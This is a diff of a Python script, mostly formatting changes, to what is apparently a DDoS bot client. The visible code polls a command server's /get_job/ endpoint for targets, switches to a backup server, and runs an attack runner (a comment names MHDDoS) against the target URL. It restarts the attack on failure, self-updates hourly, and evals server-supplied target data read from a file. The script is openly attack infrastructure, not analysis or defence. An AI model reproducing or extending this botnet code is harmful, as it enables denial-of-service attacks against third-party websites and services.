@@ -17,6 +17,7 @@ palestine_text = """
 \033[91mF\033[91mR\033[91mE\033[97mE \033[92mP\033[92mA\033[92mL\033[92mE\033[91mS\033[91mT\033[92mA\033[92mI\033[91mN\033[91mE\033[0m
 """
 
+
 class ProcessManager:
     def __init__(self):
         self.processes = []
@@ -28,6 +29,7 @@ class ProcessManager:
         for process in self.processes:
             process.terminate()
             process.join()
+
 
 class AttackController:
     def __init__(self):
@@ -64,15 +66,16 @@ class AttackController:
             # Perform the specified attack
             print(self.target_url)
             runner.run(self.target_url)
-            
+
             # Add additional conditions for other attack types if needed
             print("Attack completed!")
         except Exception as e:
             print(f"Error during attack: {e}")
-            #self.stop_attack()
+            # self.stop_attack()
         finally:
             if not self.stop_attack_flag.is_set():
                 self.start_attack()  # Restart the attack process if not signaled to stop
+
 
 def self_update():
     try:
@@ -90,11 +93,13 @@ def self_update():
     except Exception as e:
         print(f"Error during self-update: {e}")
 
+
 def stop():
     # Stop all threads before cleanup
     process_manager.stop_all_processes()
     # Add logic to stop the MHDDoS job or perform any necessary cleanup
     print("Stopping the current job")
+
 
 def hi():
     try:
@@ -108,10 +113,11 @@ def hi():
         python = sys.executable
         os.execl(python, python, *sys.argv)
 
+
 schedule.every(1).minutes.do(hi)
 
 
-def ping(base_url, attack_controller, stop_attack_flag): 
+def ping(base_url, attack_controller, stop_attack_flag):
     current_target = get_target_1()
     try:
         # Run this function every 5 seconds to check for new jobs
@@ -123,7 +129,10 @@ def ping(base_url, attack_controller, stop_attack_flag):
                 stop()
                 save_target(new_target)
                 # Start the work function in a separate process
-                process = multiprocessing.Process(target=work, args=(attack_controller, get_target_1(), stop_attack_flag))
+                process = multiprocessing.Process(
+                    target=work,
+                    args=(attack_controller, get_target_1(), stop_attack_flag),
+                )
                 process_manager.add_process(process)
                 process.start()
 
@@ -135,20 +144,23 @@ def ping(base_url, attack_controller, stop_attack_flag):
                     stop()
                     print(new_target)
                     save_target(new_target)
-                    
+
                     attack_controller.load_url()
 
-
-
             else:
-                print(f"Server {base_urls[0]} not available. Switching to backup server.")
+                print(
+                    f"Server {base_urls[0]} not available. Switching to backup server."
+                )
                 new_target = get_target(base_urls[1])
                 if new_target != current_target:
                     stop()
                     print(new_target)
                     save_target(new_target)
                     # Start the work function in a separate process
-                    process = multiprocessing.Process(target=work, args=(attack_controller, get_target_1(), stop_attack_flag))
+                    process = multiprocessing.Process(
+                        target=work,
+                        args=(attack_controller, get_target_1(), stop_attack_flag),
+                    )
                     process_manager.add_process(process)
                     process.start()
 
@@ -161,6 +173,7 @@ def ping(base_url, attack_controller, stop_attack_flag):
         # Stop the process if an error occurs
         sys.exit(1)
 
+
 def is_server_available(base_url):
     try:
         # Try sending a request to check server availability
@@ -169,30 +182,37 @@ def is_server_available(base_url):
     except requests.ConnectionError:
         return False
 
+
 def get_target(base_url):
     # Fetch the job details from the server
     target = requests.get(f"{base_url}/get_job/").json()
     return target
+
 
 def work(attack_controller, stop_attack_flag):
     attack_controller.set_stop_attack_flag(stop_attack_flag)
     attack_controller.load_url()
     attack_controller.start_attack()
 
+
 def pending():
     while True:
         schedule.run_pending()
         time.sleep(1)
 
+
 def get_target_1():
     import ast
+
     with open("current.txt", "r") as f:
         target = f.read()
     return eval(target)
 
+
 def save_target(target):
     with open("current.txt", "w") as f:
         f.write(str(target))
+
 
 schedule.every(1).hours.do(self_update)
 
@@ -210,7 +230,12 @@ if __name__ == "__main__":
             attack_controller.start_attack()
 
             # Schedule the ping function to run every 5 seconds
-            schedule.every(5).seconds.do(ping, base_url=base_url, attack_controller=attack_controller, stop_attack_flag=attack_controller.stop_attack_flag)
+            schedule.every(5).seconds.do(
+                ping,
+                base_url=base_url,
+                attack_controller=attack_controller,
+                stop_attack_flag=attack_controller.stop_attack_flag,
+            )
 
         # Start the pending function in a separate process
         pending_process = multiprocessing.Process(target=pending, name="Pending stuff")
